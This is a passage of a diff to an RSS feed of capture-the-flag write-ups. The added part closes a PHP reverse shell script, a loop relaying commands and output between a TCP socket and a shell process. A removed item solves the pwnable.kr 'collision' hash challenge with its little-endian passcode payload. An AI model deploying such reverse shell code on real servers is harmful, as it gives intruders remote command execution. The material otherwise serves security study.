+stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);
+stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);
+stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);
+stream_set_blocking(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);
+
+printit(<span class="hljs-string">"Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>"</span>);
+
+<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
+    <span class="hljs-comment">// Check for end of TCP connection</span>
+    <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) {
+        printit(<span class="hljs-string">"ERROR: Shell connection terminated"</span>);
+        <span class="hljs-keyword">break</span>;
+    }
+
+    <span class="hljs-comment">// Check for end of STDOUT</span>
+    <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) {
+        printit(<span class="hljs-string">"ERROR: Shell process terminated"</span>);
+        <span class="hljs-keyword">break</span>;
+    }
+
+    <span class="hljs-comment">// Wait until a command is end down $sock, or some</span>
+    <span class="hljs-comment">// command output is available on STDOUT or STDERR</span>
+    <span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);
+    <span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);
+
+    <span class="hljs-comment">// If we can read from the TCP socket, send</span>
+    <span class="hljs-comment">// data to process's STDIN</span>
+    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) {
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK READ"</span>);
+        <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK: <span class="hljs-subst">$input</span>"</span>);
+        fwrite(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);
+    }
+
+    <span class="hljs-comment">// If we can read from the process's STDOUT</span>
+    <span class="hljs-comment">// send data down tcp connection</span>
+    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) {
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT READ"</span>);
+        <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT: <span class="hljs-subst">$input</span>"</span>);
+        fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);
+    }
+
+    <span class="hljs-comment">// If we can read from the process's STDERR</span>
+    <span class="hljs-comment">// send data down tcp connection</span>
+    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) {
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR READ"</span>);
+        <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR: <span class="hljs-subst">$input</span>"</span>);
+        fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);
+    }
+}
+
+fclose(<span class="hljs-variable">$sock</span>);
+fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);
+fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);
+fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);
+proc_close(<span class="hljs-variable">$process</span>);
+
+<span class="hljs-comment">// Like print, but does nothing if we've daemonised ourself</span>
+<span class="hljs-comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>{
+    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) {
+        <span class="hljs-keyword">print</span> <span class="hljs-string">"<span class="hljs-subst">$string</span>\n"</span>;
+    }
+}
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[vulhub    DC-9]]></title>
             <guid>5e32b55091c449e084b4d9a059f4a5ca</guid>
@@ -1013,76 +1558,6 @@ I will malloc() and strcpy the flag there. take it.</code></pre></div>
 <img src="/_resources/c9c2f67ffee345549042aa1c05c9dd57.png" alt="ee86bb80ab597e956ad0a23c8b524869.png" width="1056" height="521" class="jop-noMdConv" />
 <p><strong>双击flag跳转至下图，得到flag</strong></p>
 <img src="/_resources/a4f5f036ab244e4e81d3af2a869fc19e.png" alt="4a8e2574afe63ed666996c8f2306b19a.png" width="993" height="571" class="jop-noMdConv" />]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[pwnable--collision]]></title>
-            <guid>fa684c42c2c8405388ff251599217ba9</guid>
-            <pubDate>Fri, 01 Apr 2022 13:29:36 GMT</pubDate>
-            <content:encoded><![CDATA[<p><strong>参考：</strong><a title="https://cloud.tencent.com/developer/article/1516391" href="https://cloud.tencent.com/developer/article/1516391">pwnable-Col</a></p>
-<p><strong>涉及知识点：</strong></p>
-<p>1.指针类型转换</p>
-<p>2.大小端序</p>
-<p>3.字符串转换ASCII码</p>
-<p>4.哈希碰撞</p>
-<hr />
-<img src="/_resources/19d6f8a121584d54acd4e9fcb4d1c256.png" alt="ff2797e2e0b0d1f6edbc067daf78e56f.png" width="681" height="452" class="jop-noMdConv" />
-<p><mark>ssh col@pwnable.kr -p2222 (pw:guest)</mark></p>
-<p><mark><img src="/_resources/f1c1316409134b36b6ab351184af4403.png" alt="8cb20b43c6286a8f14c934b62488c749.png" width="765" height="763" class="jop-noMdConv" /></mark></p>
-<p>查看文件：<img src="/home/darklord/.config/marktext/images/2022-04-12-18-35-19-image.png" /></p>
-<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
-<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> hashcode = <span class="hljs-number">0x21DD09EC</span>;
-<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">check_password</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-type">char</span>* p)</span>{
-    <span class="hljs-type">int</span>* ip = (<span class="hljs-type">int</span>*)p;
-
-    <span class="hljs-type">int</span> i;
-    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;
-    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++){
-        res += ip[i];
-    }
-    <span class="hljs-keyword">return</span> res;
-}
-
-<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span>{
-    <span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>){
-        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"usage : %s [passcode]\n"</span>, argv[<span class="hljs-number">0</span>]);
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-    }
-    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]) != <span class="hljs-number">20</span>){
-        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"passcode length should be 20 bytes\n"</span>);
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-    }
-
-    <span class="hljs-keyword">if</span>(hashcode == check_password( argv[<span class="hljs-number">1</span>] )){
-        system(<span class="hljs-string">"/bin/cat flag"</span>);
-        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-    }
-    <span class="hljs-keyword">else</span>
-        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"wrong passcode.\n"</span>);
-    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-}</code></pre></div>
-<p>可以在col.c中看到这句提示：passcode length should be 20 bytes–&gt;密码长度应该为20个字节</p>
-<p>传入check_password的是一个不可变字符串指针，然后将其强制转变为整数型指针；</p>
-<p>之后进行一共循环5次的for循环累加；</p>
-<p>p长度为20个字节，转换后ip长度依然是20个字节，结合前面查看文件类型，可以推出一共ip有5个整数，每个整数长度为4个字节</p>
-<p>hashcode的结构应该是：<code>hashcode = A + B + C + D + E=0x21DD09EC</code>；</p>
-<p>答案可以有很多种，只要满足五个相加结果为0x21DD09EC即可</p>
-<div><pre class="hljs"><code>┌──(root💀kali)-[~]
-└─# echo 'obase=10; ibase=16; 21DD09EC' | bc
-568134124</code></pre></div>
-<div><pre class="hljs"><code>└─# bc
-568134124/5
-113626824
-113626824*5
-568134120</code></pre></div>
-<div><pre class="hljs"><code>└─# echo 'obase=16; ibase=10; 113626824' | bc
-6C5CEC8</code></pre></div>
-<p>可以看到，0x21DD09EC整除5余数为4,则五个整数可以为0x6C5CEC8×4 + (0x6C5CEC8+4=0x6C5CECC)=0x6C5CEC8×4 + 0x6C5CECC</p>
-<p><strong>结果如下：</strong></p>
-<div><pre class="hljs"><code>'\xC8\xCE\xC5\x06' * 4 + '\xCC\xCE\xC5\x06'</code></pre></div>
-<p><img src="/_resources/fcb632314e63431cab92ecfe348a2fd3.png" /></p>
-<p>**PS:**这里要注意\xC8\xCE\xC5\x06及\xCC\xCE\xC5\x06都是小端序格式</p>
-]]></content:encoded>
         </item>
     </channel>
 </rss>
